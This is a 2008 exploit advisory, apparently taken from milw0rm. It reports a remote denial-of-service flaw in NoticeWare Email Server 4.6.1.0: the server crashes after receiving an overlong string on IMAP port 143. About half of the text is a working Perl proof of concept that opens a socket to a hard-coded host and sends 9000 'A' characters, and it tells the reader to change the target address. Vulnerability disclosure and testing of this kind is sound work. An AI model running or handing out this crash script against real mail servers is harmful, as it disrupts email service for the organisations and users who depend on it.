#NoticeWare Email Server

#Application:	Noticeware Email Server
#Version: 	4.6.1.0 (NoticeWare Email Server)
#Bugs:		Denial Of Service/ Remote Crash
#Exploitation:	Remote
#Date:		1st April 2008
#Author:		Ray
#Email:		native19@gmail.com
#Platforms:	Tested on XP/2003
#Taken from :	http://www.noticeware.com/noticemail.htm

#"The NoticeWareÂ™ Email Server NG is a high performance, multi-threaded email server for Windows #2000/2003/XP/Vista which supports IMAP/POP3 and SMTP protocols. Whether you are hosting your own email or #collecting mail from your ISP, the NoticeWareÂ™ Email Server will provide everything you need to run a #secure and dependable email system. Ideal for any size of business."
##########################################################################################################

#1) Denial Of Service

#Denial of service occurs when the mailserver.exe crashes after receiving huge number of characters in #IMAP port 143 [ECX =0000000,DL = ??] , the admin application will still be running but if user clicked #on Send/Receive or any other buttons the application will crash .

##########################################################################################################

#A Simple POC by Ray, dont forget to change the host address

use IO::Socket;
print "\n++ NoticeWare DOS";
print "\n++ Initiating";
my $sock = new IO::Socket::INET (
				  PeerAddr => '192.168.2.7',
				  PeerPort => '143',
				  Proto => 'TCP',
				  );
die "Could not initiate connection $!\n" unless $sock;

print $sock "A" x 9000 . "\n";
print "\n++ Have to wait for a few seconds before closing the socket";
sleep(6);
close ($sock);
print "\n++ NC and check if the victim is killed \r\n";

# milw0rm.com [2008-04-01]
